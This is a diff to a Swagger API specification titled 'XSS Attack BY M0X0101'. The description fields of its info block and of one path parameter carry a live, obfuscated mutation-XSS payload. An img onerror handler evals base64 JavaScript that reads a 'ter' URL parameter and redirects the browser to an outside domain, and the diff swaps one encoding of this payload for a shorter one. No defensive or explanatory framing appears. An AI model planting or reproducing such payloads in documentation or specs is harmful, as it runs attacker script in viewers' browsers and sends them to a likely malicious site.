@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='KGZ1bmN0aW9uKCkgewogICAgZnVuY3Rpb24gZ2V0UXVlcnlQYXJhbShuYW1lKSB7CiAgICAgICAgY29uc3QgdXJsUGFyYW1zID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTsKICAgICAgICByZXR1cm4gdXJsUGFyYW1zLmdldChuYW1lKTsKICAgIH0KCiAgICBjb25zdCB0ZXJWYWx1ZSA9IGdldFF1ZXJ5UGFyYW0oJ3RlcicpOwogICAgaWYgKHRlclZhbHVlKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBgaHR0cHM6Ly9zZXJ2aWNlZ2xvYmFsLWRpZ2l0YWxzb2x1dGlvbi5jb20vZWR1Y2F0aW9uLWNvbnRlbnQvcmVkaXJlY3QzLmh0bWw/dGVyPSR7dGVyVmFsdWV9YDsKICAgIH0KfSkoKTs=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='KGZ1bmN0aW9uKCl7dmFyIHA9bmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTt2YXIgdD1wLmdldCgndGVyJyk7aWYodCl7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0My5odG1sP3RlcicrdDt9fSkoKTs=' onerror='eval(atob(this.id))'>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='KGZ1bmN0aW9uKCkgewogICAgZnVuY3Rpb24gZ2V0UXVlcnlQYXJhbShuYW1lKSB7CiAgICAgICAgY29uc3QgdXJsUGFyYW1zID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTsKICAgICAgICByZXR1cm4gdXJsUGFyYW1zLmdldChuYW1lKTsKICAgIH0KCiAgICBjb25zdCB0ZXJWYWx1ZSA9IGdldFF1ZXJ5UGFyYW0oJ3RlcicpOwogICAgaWYgKHRlclZhbHVlKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBgaHR0cHM6Ly9zZXJ2aWNlZ2xvYmFsLWRpZ2l0YWxzb2x1dGlvbi5jb20vZWR1Y2F0aW9uLWNvbnRlbnQvcmVkaXJlY3QzLmh0bWw/dGVyPSR7dGVyVmFsdWV9YDsKICAgIH0KfSkoKTs=' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='KGZ1bmN0aW9uKCl7dmFyIHA9bmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTt2YXIgdD1wLmdldCgndGVyJyk7aWYodCl7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0My5odG1sP3RlcicrdDt9fSkoKTs=' onerror='eval(atob(this.id))'>"></form>
           format: int64
           in: path
           name: id
